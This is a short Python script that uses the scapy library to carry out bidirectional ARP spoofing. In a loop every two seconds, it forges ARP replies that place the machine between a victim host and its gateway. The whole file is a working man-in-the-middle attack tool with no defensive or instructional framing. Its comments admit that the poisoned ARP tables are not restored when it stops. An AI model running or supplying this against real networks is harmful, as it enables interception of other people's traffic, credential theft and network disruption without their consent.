from scapy.all import ARP, Ether, sendp
import time

def spoof(target_ip, spoof_ip, target_mac):
    arp = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    ether = Ether(dst=target_mac)
    packet = ether / arp
    sendp(packet, verbose=False)


#Both ways man-in-the-middle arp spoofing
def start_spoofing(victim_ip, victim_mac, gateway_ip, gateway_mac, interval=2):
    print("Starting ARP spoofing...\n")
    try:
        while True:
            spoof(victim_ip, gateway_ip, victim_mac)
            spoof(gateway_ip, victim_ip, gateway_mac)
            print(f"Spoofed {victim_ip} and {gateway_ip}")
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\nStopping... ")
        #Maybe need more things to do 
        #Restoring the ARP maybe